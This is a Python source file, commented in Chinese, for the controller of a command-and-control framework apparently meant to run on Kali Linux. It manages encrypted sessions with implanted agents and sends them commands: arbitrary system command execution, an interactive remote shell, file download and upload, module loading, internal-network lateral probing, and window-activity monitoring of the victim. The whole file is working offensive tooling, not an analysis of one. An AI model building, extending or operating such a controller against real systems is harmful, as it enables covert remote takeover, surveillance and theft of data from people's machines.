"""
C2 控制端 (Controller) - 运行在 Kali Linux
命令行交互界面，管理 Agent 会话，发送指令并接收结果
"""
import sys
import os
import json
import time
import queue
import threading
import logging
import readline

# 将项目根目录加入 path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shared.crypto import CryptoEngine, serialize_message, deserialize_message
from shared.protocol import (
    Protocol, MSG_CMD, MSG_RESULT, MSG_HEARTBEAT,
    MSG_KEY_EXCHANGE, MSG_REGISTER, CMD_EXEC, CMD_DOWNLOAD,
    CMD_UPLOAD, CMD_SYSINFO, CMD_MODULES, CMD_EXIT, CMD_SHELL,
    CMD_NETPROBE, CMD_WINMON, CMD_LOAD_MODULE, CMD_RUN_MODULE,
)
from controller.comm_server import CommServer

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("controller")


class Session:
    """Agent 会话"""

    def __init__(self, session_id: str, addr: tuple):
        self.session_id = session_id
        self.addr = addr
        self.crypto = CryptoEngine()
        self.info = {}
        self.connected = True
        self.last_seen = time.time()


class Controller:
    """C2 控制端主类"""

    BANNER = r"""
   ___ ___  _  _ ___  ___
  / __/ _ \| \| |   \/ __|
 | (_| (_) | .` | |) \__ \
  \___\___/|_|___|___/|___/
  Intelligent Adaptive C2 - Controller
"""

    def __init__(self, listen_host: str = "0.0.0.0", listen_port: int = 9999):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.server = CommServer(listen_host, listen_port)
        self.sessions = {}  # session_id -> Session
        self.active_session = None
        self.running = False
        self._lock = threading.Lock()
        self._frag_buffer = {}  # transfer_id -> {chunks: dict, total: int}
        self._msg_queue = queue.Queue()  # 消息队列，避免输出交错
        self._request_counter = 0

        # 控制端 RSA 密钥
        self.crypto = CryptoEngine()
        self.crypto.generate_rsa_keypair()

    def start(self):
        """启动控制器"""
        print(self.BANNER)
        print(f"[*] Generating RSA-2048 keypair...")
        print(f"[*] Public key fingerprint: {self._key_fingerprint()}")
        print(f"[*] Listening on {self.listen_host}:{self.listen_port}")

        self.server.set_crypto(self.crypto)
        self.server.set_on_connect(self._on_agent_connect)
        self.server.set_on_message(self._on_message)

        self.server.start()
        self.running = True

        print(f"[*] Server started. Type 'help' for commands.\n")
        self._cli_loop()

    def _key_fingerprint(self) -> str:
        import hashlib
        pub = self.crypto.get_public_key_pem()
        return hashlib.sha256(pub).hexdigest()[:16]

    def _on_agent_connect(self, session_id: str, addr: tuple):
        """Agent 连接回调"""
        with self._lock:
            session = Session(session_id, addr)
            session.crypto = CryptoEngine()
            session.crypto.generate_rsa_keypair()
            self.sessions[session_id] = session
            logger.info(f"Agent registered: {session_id} from {addr}")
            print(f"\n[+] New agent connected: {session_id[:8]}... from {addr[0]}:{addr[1]}")
            if self.active_session is None:
                self.active_session = session_id
                print(f"[*] Auto-selected active session: {session_id[:8]}...")

    def _on_message(self, session_id: str, msg_type: str, data: bytes):
        """Agent 消息回调（结果放入队列，由 CLI 主循环统一打印）"""
        with self._lock:
            session = self.sessions.get(session_id)
            if session:
                session.last_seen = time.time()

        # 心跳：回复 ack
        if msg_type == MSG_HEARTBEAT:
            with self._lock:
                session = self.sessions.get(session_id)
            if session:
                ack = Protocol.build_command("heartbeat_ack")
                self.server.send_to(session, ack, MSG_CMD)
            return

        if msg_type == MSG_RESULT:
            try:
                result = Protocol.parse_result(data)
                args = result.get("args", result.get("data", ""))
                if isinstance(args, dict) and "__frag__" in args:
                    complete = self._handle_fragment(args, session_id)
                    if complete is None:
                        return
                    import base64
                    result = Protocol.parse_result(base64.b64decode(complete))

                status = result.get("status", "unknown")
                output = result.get("data", "")
                error = result.get("error")

                if status == "ok":
                    self._msg_queue.put(("ok", output))
                elif error:
                    self._msg_queue.put(("error", error, output))
                else:
                    self._msg_queue.put(("raw", output))
            except Exception:
                self._msg_queue.put(("raw", data.decode('utf-8', errors='replace')))

        elif msg_type == MSG_REGISTER:
            self._msg_queue.put(("info", f"Agent info: {data.decode('utf-8', errors='replace')}"))

    def _print_formatted(self, output: str):
        """格式化显示模块输出"""
        try:
            data = json.loads(output)
            if isinstance(data, dict):
                print()
                # 先显示 summary
                summary = data.pop("summary", None)
                for key, val in data.items():
                    print(f"{'=' * 50}")
                    print(f"  [{key.upper()}]")
                    print(f"{'=' * 50}")
                    if isinstance(val, list):
                        if not val:
                            print("  (empty)")
                        for item in val:
                            if isinstance(item, dict):
                                print("  " + " | ".join(
                                    f"{k}={v}" for k, v in item.items() if v
                                ))
                            else:
                                print(f"  {item}")
                    elif isinstance(val, dict):
                        for k, v in val.items():
                            print(f"  {k}: {v}")
                    else:
                        for line in str(val).splitlines():
                            print(f"  {line}")
                if summary:
                    print(f"{'=' * 50}")
                    print(f"  [SUMMARY]")
                    print(f"{'=' * 50}")
                    if isinstance(summary, dict):
                        for k, v in summary.items():
                            if isinstance(v, list):
                                print(f"  {k}: {', '.join(str(i) for i in v)}")
                            else:
                                print(f"  {k}: {v}")
                print()
                return
        except (json.JSONDecodeError, TypeError):
            pass
        print(f"\n{output}\n")

    def _handle_fragment(self, args: dict, session_id: str = None):
        """
        处理分片消息，返回重组后的完整数据（base64 编码），或 None 表示未收齐
        """
        import base64
        frag_meta = args["__frag__"]
        frag_data_b64 = args.get("__frag_data__", "")
        tid = frag_meta["transfer_id"]
        idx = frag_meta["chunk_index"]
        total = frag_meta["total_chunks"]

        if tid not in self._frag_buffer:
            self._frag_buffer[tid] = {"chunks": {}, "total": total}

        buf = self._frag_buffer[tid]
        buf["chunks"][idx] = base64.b64decode(frag_data_b64)
        received = len(buf["chunks"])
        print(f"[*] Fragment {received}/{total} received (transfer: {tid[:8]})")

        if received < total:
            return None

        complete = b"".join(buf["chunks"][i] for i in range(total))
        del self._frag_buffer[tid]
        print(f"[*] All {total} fragments reassembled ({len(complete)} bytes)")
        return base64.b64encode(complete).decode("ascii")

    # ── CLI 交互 ──────────────────────────────────────────

    def _cli_loop(self):
        """命令行主循环"""
        while self.running:
            try:
                self._flush_messages()
                prompt = self._make_prompt()
                line = input(prompt).strip()
                if not line:
                    continue
                self._handle_command(line)
                # 等待并显示结果
                self._flush_messages(timeout=3.0)
            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to quit.")
            except EOFError:
                break

    def _flush_messages(self, timeout: float = 0.1):
        """从队列中取出并打印所有待显示消息"""
        while True:
            try:
                msg = self._msg_queue.get(timeout=timeout)
                self._display_message(msg)
                timeout = 0.05  # 后续消息用短超时
            except queue.Empty:
                break

    def _display_message(self, msg: tuple):
        """根据消息类型格式化打印"""
        if msg[0] == "ok":
            self._print_formatted(msg[1])
        elif msg[0] == "error":
            print(f"\n[!] Error: {msg[1]}")
            if msg[2]:
                print(f"{msg[2]}")
        elif msg[0] == "info":
            print(f"\n[*] {msg[1]}")
        elif msg[0] == "raw":
            print(f"\n{msg[1]}")

    def _make_prompt(self) -> str:
        if self.active_session:
            sid = self.active_session[:8]
            return f"c2 [{sid}]> "
        return "c2 [no-session]> "

    def _handle_command(self, line: str):
        parts = line.split(None, 1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        if cmd == "help":
            self._cmd_help()
        elif cmd == "sessions":
            self._cmd_sessions()
        elif cmd == "select":
            self._cmd_select(args)
        elif cmd == "exec":
            self._cmd_exec(args)
        elif cmd == "shell":
            self._cmd_shell()
        elif cmd == "sysinfo":
            self._cmd_sysinfo()
        elif cmd == "download":
            self._cmd_download(args)
        elif cmd == "upload":
            self._cmd_upload(args)
        elif cmd == "modules":
            self._cmd_modules()
        elif cmd == "load_mod":
            self._cmd_load_module(args)
        elif cmd == "run_mod":
            self._cmd_run_module(args)
        elif cmd == "netprobe":
            self._cmd_netprobe(args)
        elif cmd == "winmon":
            self._cmd_winmon(args)
        elif cmd == "exit" or cmd == "quit":
            self._cmd_exit()
        else:
            print(f"[!] Unknown command: {cmd}. Type 'help' for available commands.")

    def _cmd_help(self):
        print("""
Commands:
  sessions          - List connected agents
  select <id>       - Select active agent session
  exec <command>    - Execute system command on agent
  shell             - Enter interactive shell mode
  sysinfo           - Get agent system information
  download <path>   - Download file from agent
  upload <path>     - Upload file to agent
  modules           - List loaded modules
  load_mod <name>   - Load a module on the agent
  run_mod <name>    - Execute a loaded module (with optional key=value args)
  netprobe [subnet] - Network lateral probe (discover live hosts)
  winmon [seconds]  - Window activity monitor (default 30s)
  help              - Show this help
  exit              - Quit controller
""")

    def _cmd_sessions(self):
        with self._lock:
            if not self.sessions:
                print("[*] No connected agents.")
                return
            print(f"\n{'ID':<10} {'Address':<20} {'Last Seen':<20} {'Active'}")
            print("-" * 65)
            for sid, sess in self.sessions.items():
                active = " *" if sid == self.active_session else ""
                age = int(time.time() - sess.last_seen)
                addr_str = f"{sess.addr[0]}:{sess.addr[1]}"
                print(f"{sid[:8]:<10} {addr_str:<20} {age}s ago{'':<13} {active}")
            print()

    def _cmd_select(self, args: str):
        if not args:
            print("[!] Usage: select <session_id_prefix>")
            return
        with self._lock:
            matches = [sid for sid in self.sessions if sid.startswith(args)]
            if len(matches) == 1:
                self.active_session = matches[0]
                print(f"[*] Active session: {matches[0][:8]}...")
            elif len(matches) > 1:
                print(f"[!] Ambiguous ID. Matches: {[s[:8] for s in matches]}")
            else:
                print(f"[!] No session matching '{args}'")

    def _send_command(self, cmd_type: str, args: dict = None):
        """向活跃 Agent 发送指令"""
        if not self.active_session:
            print("[!] No active session. Use 'sessions' and 'select'.")
            return

        with self._lock:
            session = self.sessions.get(self.active_session)
            if not session or not session.connected:
                print("[!] Active session disconnected.")
                return

            self._request_counter += 1
            if args is None:
                args = {}
            args["__request_id__"] = self._request_counter

            payload = Protocol.build_command(cmd_type, args)
            self.server.send_to(session, payload, MSG_CMD)

    def _cmd_exec(self, args: str):
        if not args:
            print("[!] Usage: exec <command>")
            return
        self._send_command(CMD_EXEC, {"cmd": args})

    def _cmd_shell(self):
        """交互式 Shell 模式"""
        if not self.active_session:
            print("[!] No active session.")
            return
        print("[*] Interactive shell mode. Type 'exit' to return.\n")
        while True:
            try:
                self._flush_messages()
                cmd = input("shell> ").strip()
                if cmd.lower() == "exit":
                    break
                if cmd:
                    self._send_command(CMD_EXEC, {"cmd": cmd})
                    self._flush_messages(timeout=3.0)
            except KeyboardInterrupt:
                break
        print("[*] Exited shell mode.")

    def _cmd_sysinfo(self):
        self._send_command(CMD_SYSINFO)

    def _cmd_download(self, args: str):
        if not args:
            print("[!] Usage: download <remote_path>")
            return
        self._send_command(CMD_DOWNLOAD, {"path": args})

    def _cmd_upload(self, args: str):
        if not args:
            print("[!] Usage: upload <local_path>")
            return
        if not os.path.exists(args):
            print(f"[!] Local file not found: {args}")
            return
        import base64
        with open(args, "rb") as f:
            data = base64.b64encode(f.read()).decode("ascii")
        filename = os.path.basename(args)
        self._send_command(CMD_UPLOAD, {"filename": filename, "data": data})

    def _cmd_modules(self):
        self._send_command(CMD_MODULES)

    def _cmd_load_module(self, args: str):
        if not args:
            print("[!] Usage: load_mod <module_name>")
            return
        self._send_command(CMD_LOAD_MODULE, {"name": args.strip()})

    def _cmd_run_module(self, args: str):
        """执行已加载模块: run_mod <name> [key=val ...]"""
        if not args:
            print("[!] Usage: run_mod <module_name> [key=value ...]")
            return
        parts = args.split(None, 1)
        module_name = parts[0]
        kwargs = {}
        if len(parts) > 1:
            import shlex
            for token in shlex.split(parts[1]):
                if "=" in token:
                    k, v = token.split("=", 1)
                    kwargs[k] = v
                else:
                    print(f"[!] Invalid argument: {token} (expected key=value)")
                    return
        payload = {"name": module_name, **kwargs}
        self._send_command(CMD_RUN_MODULE, payload)

    def _cmd_netprobe(self, args: str):
        """内网横向探测"""
        kwargs = {}
        if args:
            kwargs["subnet"] = args.strip()
        self._send_command(CMD_NETPROBE, kwargs)
        print("[*] Network probe sent. Waiting for results...")

    def _cmd_winmon(self, args: str):
        """窗口活动监控"""
        duration = 30
        if args:
            try:
                duration = int(args.strip())
            except ValueError:
                print("[!] Usage: winmon [seconds]")
                return
        self._send_command(CMD_WINMON, {"duration": duration})
        print(f"[*] Window monitor started ({duration}s). Waiting for results...")

    def _cmd_exit(self):
        print("[*] Shutting down...")
        self.running = False
        self.server.stop()
        self.server.close_all_sessions()


def main():
    import argparse
    parser = argparse.ArgumentParser(description="C2 Controller")
    parser.add_argument("--host", default="0.0.0.0", help="Listen host")
    parser.add_argument("--port", type=int, default=9999, help="Listen port")
    args = parser.parse_args()

    controller = Controller(args.host, args.port)
    controller.start()


if __name__ == "__main__":
    main()
